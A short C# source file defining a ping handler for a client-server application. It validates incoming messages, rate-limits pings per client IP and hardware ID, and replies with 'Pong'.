using System;
using System.Collections.Concurrent;
using Server.Connectings;

namespace Server.Messages;

internal class HandlerPing
{
	private static readonly ConcurrentDictionary<string, DateTime> _lastPingTime = new ConcurrentDictionary<string, DateTime>();

	private static readonly TimeSpan _minPingInterval = TimeSpan.FromMilliseconds(500.0);

	public static void Read(Clients client, object[] objects)
	{
		if (client == null || objects == null || objects.Length < 1)
		{
			client?.Disconnect();
			return;
		}
		if (client.Tag == null)
		{
			client.Disconnect();
			return;
		}
		string clientKey = client.IP + ":" + (client.Hwid ?? "unknown");
		DateTime now = DateTime.UtcNow;
		if (!_lastPingTime.TryGetValue(clientKey, out var lastPing) || !(now - lastPing < _minPingInterval))
		{
			_lastPingTime[clientKey] = now;
			client.lastPing.Last();
			client.Send(new object[1] { "Pong" });
		}
	}
}
